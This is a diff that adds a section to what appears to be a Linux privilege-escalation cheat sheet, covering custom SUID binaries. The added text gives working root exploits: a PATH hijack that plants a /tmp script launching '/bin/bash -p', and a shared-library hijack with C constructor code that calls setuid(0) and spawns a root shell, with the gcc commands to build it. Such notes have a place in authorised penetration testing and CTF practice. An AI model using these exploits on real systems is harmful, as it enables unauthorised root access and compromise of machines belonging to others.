@@ -89,3 +89,36 @@ readelf -d <PATH>
 - Shows NEEDED libraries and RPATH/RUNPATH: check whether that location is writable.
 - `LD_LIBRARY_PATH`/`LD_PRELOAD` do not work for ordinary SUID execution.
 - A copied or rewritten privileged file can lose its mode or capability xattr.
+
+## Custom SUID: PATH and missing library
+Inspect a copy, not the live file:
+
+```bash
+cp <PATH> /tmp/x
+strings /tmp/x | less
+ltrace /tmp/x 2>&1 | head -40
+ldd /tmp/x
+LD_DEBUG=libs /tmp/x 2>&1 | grep -i 'error\|not found\|trying'
+```
+- `strings` showing `service apache2 start`, `cat file`, `ps` … without a full path = relative command.
+- `strace`/`ltrace` on the real SUID file run unprivileged (setuid ignored); on a copy they only list lookups: use them to find names, not to test escalation.
+
+Relative command:
+```bash
+printf '%s\n' '#!/bin/sh' '/bin/bash -p' > /tmp/<COMMAND>
+chmod +x /tmp/<COMMAND>
+PATH=/tmp:$PATH <PATH>
+```
+Missing or writable-path shared library (`ldd`/`readelf -d` show `not found` or an RPATH you can write):
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+__attribute__((constructor)) void init() { setuid(0); setgid(0); system("/bin/bash -p"); }
+```
+```bash
+gcc -shared -fPIC -o <WRITABLE-DIR>/<LIBNAME>.so exp.c
+<PATH>
+```
+- Binary must call `setuid(0)` itself or be root-owned SUID; `bash -p` keeps the effective ID.
+- Common offenders: `/usr/local/bin/*` helpers, backup/status tools, copies of `vim`/`find` in odd places.
